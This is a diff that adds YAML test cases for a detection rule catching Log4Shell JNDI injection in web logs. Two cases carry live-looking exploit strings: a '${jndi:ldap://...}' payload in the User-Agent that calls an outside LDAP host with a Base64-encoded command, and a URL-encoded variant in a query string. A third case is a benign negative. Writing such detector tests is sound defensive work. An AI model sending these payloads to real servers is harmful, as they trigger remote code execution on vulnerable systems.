@@ -1,0 +1,35 @@
+rule_id: 43d0da84-1557-4c26-b1e2-2f297837f0ad
+cases:
+  - name: JNDI payload in the User-Agent
+    expect: match
+    event:
+      src_ip: 45.155.205.233
+      dst_ip: 10.10.0.21
+      dst_port: 8080
+      cs-host: api.opensoc.example
+      cs-method: GET
+      c-uri: /api/v1/status
+      c-useragent: '${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==}'
+      sc-status: 400
+  - name: URL-encoded JNDI payload in the query string
+    expect: match
+    event:
+      src_ip: 45.155.205.233
+      dst_ip: 10.10.0.21
+      dst_port: 8080
+      cs-host: api.opensoc.example
+      cs-method: GET
+      c-uri: '/search?q=%24%7Bjndi:ldap://45.155.205.233/a%7D'
+      c-useragent: 'curl/8.5.0'
+      sc-status: 200
+  - name: Template-like query string without JNDI
+    expect: no_match
+    event:
+      src_ip: 10.20.30.40
+      dst_ip: 10.10.0.21
+      dst_port: 8080
+      cs-host: api.opensoc.example
+      cs-method: GET
+      c-uri: '/render?tpl=${username}'
+      c-useragent: 'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0'
+      sc-status: 200
